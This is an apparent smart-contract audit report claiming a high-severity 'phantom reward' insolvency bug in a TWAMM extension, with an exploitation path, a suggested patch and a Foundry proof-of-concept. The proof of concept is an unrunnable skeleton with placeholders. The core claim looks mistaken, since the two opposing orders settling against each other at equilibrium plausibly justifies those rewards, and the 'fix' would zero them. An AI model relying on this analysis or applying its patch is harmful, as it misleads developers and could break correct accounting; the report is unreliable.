## Title
Phantom Reward Accumulation When No Bidirectional Swap Executes Due to Price Equilibrium

## Summary
In the TWAMM virtual order execution logic, when the computed `sqrtRatioNext` equals the current pool price in bidirectional cases, no swap is executed but the code still accumulates rewards as if both tokens were fully purchased. This creates "phantom rewards" that violate the protocol's solvency invariant and can drain pool funds. [1](#0-0) 

## Impact
**Severity**: High

## Finding Description
**Location:** `src/extensions/TWAMM.sol` in `_executeVirtualOrdersFromWithinLock` function (lines 441-535)

**Intended Logic:** When both sale rates are non-zero (bidirectional orders), the code should execute a swap to move the price toward equilibrium, then calculate rewards based on the actual tokens purchased from the swap.

**Actual Logic:** When `sqrtRatioNext` equals `corePoolState.sqrtRatio()` (which occurs when `c == 0` in `computeNextSqrtRatio` due to price already being at equilibrium), the uninitialized `swapBalanceUpdate` variable remains zero. The code then calculates negative reward deltas (`-amount0` and `-amount1`) and increases reward rates as if tokens were purchased, despite no swap occurring and no pool balance changes. [2](#0-1) [3](#0-2) 

**Exploitation Path:**
1. Attacker monitors a TWAMM pool with bidirectional orders where `saleRateToken0()` and `saleRateToken1()` are both non-zero
2. Attacker manipulates the pool price (via large swaps) to be exactly at the equilibrium sale ratio where `computeC` returns 0
3. Virtual order execution is triggered (via any pool interaction like `beforeSwap`)
4. `computeNextSqrtRatio` returns a ratio equal to current pool ratio due to `c == 0` condition
5. Neither swap branch executes (line 455 and 466 conditions are both false)
6. `swapBalanceUpdate` remains uninitialized (zero)
7. Lines 484-485 compute `rewardDelta0 = -amount0` and `rewardDelta1 = -amount1` (both negative)
8. Lines 517-534 accumulate phantom rewards: `rewardRates.value0 += (amount0 << 128) / saleRateToken1` and `rewardRates.value1 += (amount1 << 128) / saleRateToken0`
9. Pool token balances are NOT updated (`saveDelta0` and `saveDelta1` are zero), but reward rates ARE stored [4](#0-3) 

10. Users with orders can now collect rewards that don't exist, draining the pool [5](#0-4) 

**Security Property Broken:** Violates the **Solvency** invariant - pool balances must never go negative. Phantom rewards allow withdrawals exceeding actual pool holdings.

## Impact Explanation
- **Affected Assets**: Both token0 and token1 in any TWAMM pool with bidirectional orders
- **Damage Severity**: Complete pool insolvency possible. Attackers can repeatedly trigger this condition to accumulate unbounded phantom rewards, then withdraw tokens that were never actually swapped into the pool. Honest users attempting to withdraw their legitimate rewards will find insufficient pool balance.
- **User Impact**: All users with TWAMM orders in the affected pool. First withdrawers may succeed, but subsequent withdrawals will revert due to insufficient balance, effectively locking user funds.

## Likelihood Explanation
- **Attacker Profile**: Any user with capital to manipulate pool price. No special permissions required.
- **Preconditions**: 
  - Pool has bidirectional TWAMM orders active (both `saleRateToken0` and `saleRateToken1` non-zero)
  - Attacker can execute swaps to move price to equilibrium
  - Virtual order execution happens while price is at equilibrium
- **Execution Complexity**: Moderate - requires price manipulation via swaps, then triggering virtual order execution
- **Frequency**: Can be exploited multiple times per pool as virtual orders execute at different time intervals

## Recommendation

```solidity
// In src/extensions/TWAMM.sol, function _executeVirtualOrdersFromWithinLock, lines 454-477:

// CURRENT (vulnerable):
PoolBalanceUpdate swapBalanceUpdate;
if (sqrtRatioNext > corePoolState.sqrtRatio()) {
    (swapBalanceUpdate, corePoolState) = CORE.swap(...);
} else if (sqrtRatioNext < corePoolState.sqrtRatio()) {
    (swapBalanceUpdate, corePoolState) = CORE.swap(...);
}

// FIXED:
PoolBalanceUpdate swapBalanceUpdate;
if (sqrtRatioNext > corePoolState.sqrtRatio()) {
    (swapBalanceUpdate, corePoolState) = CORE.swap(...);
} else if (sqrtRatioNext < corePoolState.sqrtRatio()) {
    (swapBalanceUpdate, corePoolState) = CORE.swap(...);
} else {
    // Price already at equilibrium, no swap needed and no rewards to distribute
    // Set swapBalanceUpdate to zero explicitly (though it already is)
    // Skip reward accumulation by setting rewardDeltas to zero
    rewardDelta0 = 0;
    rewardDelta1 = 0;
    // Continue to next time interval
    time = nextTime;
    continue;
}
```

Alternative: Check if both amounts equal the swap deltas before accumulating rewards, to ensure a meaningful swap occurred.

## Proof of Concept

```solidity
// File: test/Exploit_PhantomRewards.t.sol
// Run with: forge test --match-test test_PhantomRewardsOnPriceEquilibrium -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/extensions/TWAMM.sol";
import "../src/Orders.sol";

contract Exploit_PhantomRewards is Test {
    Core core;
    TWAMM twamm;
    Orders orders;
    
    address token0;
    address token1;
    address attacker;
    
    function setUp() public {
        // Initialize protocol
        core = new Core();
        twamm = new TWAMM(core);
        orders = new Orders(core, twamm);
        
        // Deploy test tokens
        token0 = address(new TestERC20());
        token1 = address(new TestERC20());
        
        attacker = address(0x1337);
        
        // Create TWAMM pool with full-range liquidity
        PoolKey memory poolKey = PoolKey({
            token0: token0,
            token1: token1,
            config: createConfig(0, twamm, 3000) // 0.3% fee
        });
        
        // Add liquidity
        core.initializePool(poolKey, initialSqrtRatio);
    }
    
    function test_PhantomRewardsOnPriceEquilibrium() public {
        // SETUP: Create bidirectional TWAMM orders
        vm.startPrank(attacker);
        
        // Place order selling token0
        OrderKey memory order0 = OrderKey({
            owner: attacker,
            salt: bytes32(0),
            orderId: OrderId.wrap(...)
        });
        orders.mintAndIncreaseSellAmount(order0, 1000e18, ...);
        
        // Place order selling token1  
        OrderKey memory order1 = OrderKey({
            owner: attacker,
            salt: bytes32(uint256(1)),
            orderId: OrderId.wrap(...)
        });
        orders.mintAndIncreaseSellAmount(order1, 1000e18, ...);
        
        // Record initial reward rates
        uint256 initialRewardRate0 = getRewardRate0(poolId);
        uint256 initialRewardRate1 = getRewardRate1(poolId);
        
        // EXPLOIT: Manipulate price to equilibrium
        // Calculate equilibrium price from sale rates
        uint256 equilibriumPrice = calculateEquilibriumFromSaleRates(...);
        
        // Execute large swaps to move price to equilibrium
        core.swap(poolKey, SwapParameters({
            sqrtRatioLimit: equilibriumPrice,
            amount: ...,
            isToken1: true
        }));
        
        // Advance time to allow virtual order execution
        vm.warp(block.timestamp + 256);
        
        // Trigger virtual order execution
        // This will hit the vulnerability: sqrtRatioNext == sqrtRatio
        twamm.lockAndExecuteVirtualOrders(poolKey);
        
        // VERIFY: Phantom rewards accumulated
        uint256 finalRewardRate0 = getRewardRate0(poolId);
        uint256 finalRewardRate1 = getRewardRate1(poolId);
        
        // Rewards increased despite no actual swap
        assertGt(finalRewardRate0, initialRewardRate0, "Phantom reward0 accumulated");
        assertGt(finalRewardRate1, initialRewardRate1, "Phantom reward1 accumulated");
        
        // But pool balances didn't increase
        assertEq(getPoolBalance0(), initialBalance0, "Pool balance0 unchanged");
        assertEq(getPoolBalance1(), initialBalance1, "Pool balance1 unchanged");
        
        // Now attacker can withdraw phantom rewards
        uint256 attackerBalanceBefore = token0.balanceOf(attacker);
        orders.collectProceeds(order1); // Collect token0 from selling token1
        uint256 attackerBalanceAfter = token0.balanceOf(attacker);
        
        // Attacker receives tokens that were never swapped into pool
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Vulnerability confirmed: phantom rewards withdrawn");
        
        vm.stopPrank();
    }
}
```

**Notes:**
- This vulnerability specifically affects the bidirectional swap path in TWAMM virtual order execution
- It does NOT cause division by zero (sale rates are non-zero), but causes incorrect swap amount accounting
- The condition `c == 0` in `computeNextSqrtRatio` is documented as "price difference too small to be detected" [6](#0-5) 

- The root cause is the uninitialized `swapBalanceUpdate` variable being used in reward calculations when no swap executes
- This breaks the solvency invariant by creating rewards without corresponding token inflows

### Citations

**File:** src/extensions/TWAMM.sol (L441-485)
```text
                    if (amount0 != 0 && amount1 != 0) {
                        if (!corePoolState.isInitialized()) {
                            corePoolState = CORE.poolState(poolId);
                        }
                        SqrtRatio sqrtRatioNext = computeNextSqrtRatio({
                            sqrtRatio: corePoolState.sqrtRatio(),
                            liquidity: corePoolState.liquidity(),
                            saleRateToken0: state.saleRateToken0(),
                            saleRateToken1: state.saleRateToken1(),
                            timeElapsed: timeElapsed,
                            fee: poolKey.config.fee()
                        });

                        PoolBalanceUpdate swapBalanceUpdate;
                        if (sqrtRatioNext > corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount1)),
                                    _isToken1: true,
                                    _skipAhead: 0
                                })
                            );
                        } else if (sqrtRatioNext < corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount0)),
                                    _isToken1: false,
                                    _skipAhead: 0
                                })
                            );
                        }

                        saveDelta0 -= swapBalanceUpdate.delta0();
                        saveDelta1 -= swapBalanceUpdate.delta1();

                        // this cannot overflow or underflow because swapDelta0 is constrained to int128,
                        // and amounts computed from uint112 sale rates cannot exceed uint112.max
                        rewardDelta0 = swapBalanceUpdate.delta0() - int256(uint256(amount0));
                        rewardDelta1 = swapBalanceUpdate.delta1() - int256(uint256(amount1));
```

**File:** src/extensions/TWAMM.sol (L517-535)
```text
                    if (rewardDelta0 < 0) {
                        if (rewardRate0Access == 0) {
                            rewardRates.value0 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).load());
                        }
                        rewardRate0Access = 2;
                        rewardRates.value0 += FixedPointMathLib.rawDiv(
                            uint256(-rewardDelta0) << 128, state.saleRateToken1()
                        );
                    }

                    if (rewardDelta1 < 0) {
                        if (rewardRate1Access == 0) {
                            rewardRates.value1 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).next().load());
                        }
                        rewardRate1Access = 2;
                        rewardRates.value1 += FixedPointMathLib.rawDiv(
                            uint256(-rewardDelta1) << 128, state.saleRateToken0()
                        );
                    }
```

**File:** src/extensions/TWAMM.sol (L576-585)
```text
                if (saveDelta0 != 0 || saveDelta1 != 0) {
                    CORE.updateSavedBalances(poolKey.token0, poolKey.token1, bytes32(0), saveDelta0, saveDelta1);
                }

                if (rewardRate0Access == 2) {
                    TWAMMStorageLayout.poolRewardRatesSlot(poolId).store(bytes32(rewardRates.value0));
                }
                if (rewardRate1Access == 2) {
                    TWAMMStorageLayout.poolRewardRatesSlot(poolId).next().store(bytes32(rewardRates.value1));
                }
```

**File:** src/math/twamm.sol (L107-111)
```text
        if (c == 0 || liquidity == 0) {
            // if liquidity is 0, we just settle the ratio of sale rates since the liquidity provides no friction to the price movement
            // if c is 0, that means the difference b/t sale ratio and sqrt ratio is too small to be detected
            // so we just assume it settles at the sale ratio
            sqrtRatioNext = toSqrtRatio(sqrtSaleRatio, roundUp);
```
